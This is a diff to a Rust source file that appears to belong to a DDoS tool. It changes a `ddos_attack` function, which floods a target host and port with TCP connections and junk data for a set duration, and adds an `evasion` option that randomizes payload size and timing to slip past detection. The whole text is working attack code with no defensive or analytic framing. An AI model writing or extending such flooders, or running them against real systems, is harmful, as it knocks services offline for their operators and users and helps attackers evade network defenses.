@@ -9,15 +9,19 @@ use tokio::io::AsyncWriteExt;
 use std::time::Duration;
 use tokio::time::Instant;
 
-pub async fn ddos_attack(attack_type: String, target: String, port: u16, duration: u64) {
+pub async fn ddos_attack(attack_type: String, target: String, port: u16, duration: u64, evasion: bool) {
     let end = Instant::now() + Duration::from_secs(duration);
     let junk = vec![0u8; 1024];
 
     match attack_type.as_str() {
         "tcp" => {
             while Instant::now() < end {
+                let junk = if evasion { vec![0u8; rand::random::<usize>() % 1024 + 1] } else { vec![0u8; 1024] };
                 if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
                     let _ = stream.write_all(&junk).await;
+                }
+                if evasion {
+                    tokio::time::sleep(Duration::from_millis(rand::random::<u64>() % 100)).await;
                 }
                 tokio::task::yield_now().await;
             }
